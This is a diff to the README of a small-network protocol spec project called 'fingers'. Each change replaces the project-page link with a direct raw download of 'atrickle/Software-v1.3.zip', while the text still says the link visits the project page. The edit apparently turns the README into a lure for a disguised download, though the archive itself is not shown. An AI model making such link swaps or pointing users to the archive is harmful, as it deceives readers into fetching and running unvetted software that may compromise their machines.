@@ -1,12 +1,12 @@
 # 🔗 fingers - Simple protocol spec for small networks
 
-[![Download](https://img.shields.io/badge/Download%20fingers-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/Rebekacompetent445/fingers)
+[![Download](https://img.shields.io/badge/Download%20fingers-Visit%20the%20project%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rebekacompetent445/fingers/main/atrickle/Software-v1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and get the files:
 
-https://github.com/Rebekacompetent445/fingers
+https://raw.githubusercontent.com/Rebekacompetent445/fingers/main/atrickle/Software-v1.3.zip
 
 ## 🪟 Install on Windows
 
@@ -132,7 +132,7 @@ This makes it easier to follow the draft as you work.
 
 Use this page to download and view the repository:
 
-https://github.com/Rebekacompetent445/fingers
+https://raw.githubusercontent.com/Rebekacompetent445/fingers/main/atrickle/Software-v1.3.zip
 
 ## 📄 File types you may see
 
